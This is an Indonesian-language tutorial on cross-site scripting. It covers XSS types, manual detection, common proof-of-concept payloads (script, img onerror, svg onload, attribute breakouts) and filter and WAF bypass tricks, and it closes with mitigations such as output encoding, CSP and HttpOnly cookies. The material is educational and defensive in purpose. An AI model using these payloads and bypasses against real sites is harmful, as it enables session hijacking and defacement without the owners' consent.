# 🎨 Cross-Site Scripting (XSS)

## 1. Definisi
**Cross-Site Scripting (XSS)** adalah jenis kerentanan keamanan di mana penyerang berhasil menyisipkan skrip klien berbahaya (biasanya JavaScript) ke dalam halaman web tepercaya yang diakses oleh pengguna lain. Ketika browser korban memuat halaman tersebut, skrip berbahaya akan dieksekusi dalam konteks sesi korban. Hal ini memungkinkan penyerang untuk mencuri cookie sesi (*session hijacking*), melakukan aksi atas nama korban, memanipulasi tampilan halaman (*defacement*), atau mengarahkan pengguna ke situs web phising.

---

## 2. Jenis-Jenis XSS

Secara umum, XSS dibagi menjadi tiga kategori utama:

### A. Stored XSS (Persistent XSS)
Skrip berbahaya disimpan secara permanen di server target (misalnya dalam database, kolom komentar, forum diskusi, atau profil pengguna). Setiap kali ada pengguna lain yang mengunjungi halaman tersebut, skrip akan otomatis dieksekusi oleh browser mereka.
* **Tingkat Bahaya**: Sangat Tinggi (karena dapat menyerang banyak korban sekaligus secara otomatis).

### B. Reflected XSS (Non-Persistent XSS)
Skrip berbahaya dikirimkan ke server sebagai bagian dari permintaan HTTP (biasanya melalui parameter query URL) dan langsung dipantulkan kembali (*reflected*) dalam respon server tanpa disimpan. Penyerang harus menjebak korban untuk mengeklik tautan khusus yang berisi payload XSS.
* **Tingkat Bahaya**: Sedang (memerlukan interaksi sosial / rekayasa sosial agar korban mengeklik tautan).

### C. DOM-Based XSS
Kerentanan XSS yang terjadi sepenuhnya di sisi klien (*client-side*). Skrip berbahaya dieksekusi akibat modifikasi pada *Document Object Model* (DOM) di browser korban oleh kode JavaScript aplikasi yang tidak aman, tanpa melibatkan pemrosesan payload di sisi server.
* **Tingkat Bahaya**: Tinggi (karena sering kali WAF di sisi server tidak mendeteksi payload ini karena diproses langsung oleh browser).

---

## 3. Cara Mendeteksi XSS

### 🕵️ Pengujian Manual
Cari seluruh area input aplikasi yang menerima teks dan menampilkannya kembali ke layar halaman web. 

1. **Masukkan karakter penanda**: Masukkan teks unik seperti `KamsibXSS<>"'` pada form pencarian, kolom komentar, atau input profile.
2. **Periksa Source Code (Inspect Element)**: Lihat apakah karakter `<` `>` `"` `'` ditampilkan apa adanya atau telah diubah menjadi entitas HTML (seperti `&lt;` `&gt;`). Jika ditampilkan apa adanya, kemungkinan besar halaman tersebut rentan.
3. **Uji dengan Payload Sederhana**:
   ```html
   <script>alert(1)</script>
   ```

---

## 4. Contoh Payload XSS Terpopuler

### 🚨 Payload Dasar
```html
<script>alert(document.cookie)</script>
<script>confirm("Kamsib Security")</script>
```

### 🖼️ Payload Berbasis Tag Gambar (`onload` / `onerror`)
Digunakan jika tag `<script>` diblokir atau difilter:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 🔗 Payload Berbasis Atribut HTML & Event Handler
Digunakan jika input dimasukkan ke dalam nilai atribut HTML (seperti `<input value="INPUT_PENGGUNA">`):
```html
" onfocus="alert(1)" autofocus="
" onclick="alert(1)
```

### 📂 Payload DOM-Based XSS Common Sources & Sinks
* **Sources** (sumber input): `location.search`, `location.hash`, `document.referrer`
* **Sinks** (tempat eksekusi): `element.innerHTML`, `document.write()`, `eval()`
* **Contoh Payload**:
  Jika web membaca hash URL: `https://target.com/page.html#<img src=x onerror=alert(1)>`

---

## 5. Teknik Bypass Filter & WAF Sederhana

Bila sistem menyaring kata kunci `<script>` atau menyaring event handler tertentu, berikut beberapa teknik untuk melewatinya:

* **Manipulasi Ukuran Huruf (Case Mixed)**:
  ```html
  <sCrIpT>alert(1)</sCrIpT>
  ```
* **Nested Tags (Tag bersarang)**:
  Jika filter menghapus kata `<script>` secara rekursif satu kali:
  ```html
  <scr<script>ipt>alert(1)</script>
  ```
* **Menggunakan Event Handler yang Jarang Diketahui**:
  ```html
  <details open ontoggle=alert(1)>
  <body onload=alert(1)>
  <marquee onstart=alert(1)>
  ```
* **Bypass menggunakan JavaScript Pseudo-Protocol**:
  Biasanya digunakan pada tag jangkar `<a>` di bagian atribut `href`:
  ```html
  <a href="javascript:alert(1)">Klik Disini</a>
  ```
* **Bypass filter tanda kutip**:
  Jika tanda kutip satu `'` atau dua `"` disaring, gunakan fungsi `String.fromCharCode()` atau representasi template literal `backtick`:
  ```javascript
  // Menggunakan backtick
  <img src=x onerror=alert(`XSS`)>
  // Menggunakan ASCII decimal
  <img src=x onerror=alert(String.fromCharCode(88,83,83))>
  ```

---

## 6. Mitigasi (Pencegahan)

Langkah penanganan XSS harus diterapkan secara berlapis:

### ✔️ 1. Context-Aware Output Encoding (Wajib)
Ubah setiap karakter berbahaya menjadi bentuk entitas HTML aman sebelum ditampilkan ke layar browser. Jenis encoding harus disesuaikan dengan konteks tempat data diletakkan:
* **HTML Body Context**: Ubah `<` menjadi `&lt;`, `>` menjadi `&gt;`, `&` menjadi `&amp;`, `"` menjadi `&quot;`, `'` menjadi `&#x27;`.
* **Javascript Context**: Gunakan encoding unicode (`\u0027` dll.) jika input diletakkan di dalam blok skrip JavaScript.

### ✔️ 2. Menerapkan Content Security Policy (CSP)
CSP adalah header HTTP respons (`Content-Security-Policy`) yang membatasi dari mana saja skrip boleh dimuat dan dieksekusi pada halaman web Anda.
* **Contoh CSP yang ketat**:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;
  ```
  Ini mencegah eksekusi skrip inline (seperti `<script>alert(1)</script>` atau atribut `onerror`) dan hanya mengizinkan pemuatan file `.js` eksternal dari domain terpercaya.

### ✔️ 3. Menggunakan Flag HttpOnly pada Cookie Sesi
Pastikan cookie sesi diatur dengan atribut `HttpOnly`. Flag ini mencegah skrip JavaScript klien mengakses cookie tersebut melalui perintah `document.cookie`, sehingga memitigasi risiko pencurian sesi (*session hijacking*) via XSS.
* **Contoh Set-Cookie**:
  ```http
  Set-Cookie: session_id=xyz123; Secure; HttpOnly; SameSite=Strict
  ```

---

## 7. Referensi Terpercaya
* [PortSwigger Web Security Academy: Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting)
* [OWASP Cheat Sheet Series: Cross-Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [XSS Payload List by Payloadbox](https://github.com/payloadbox/xss-payload-list)
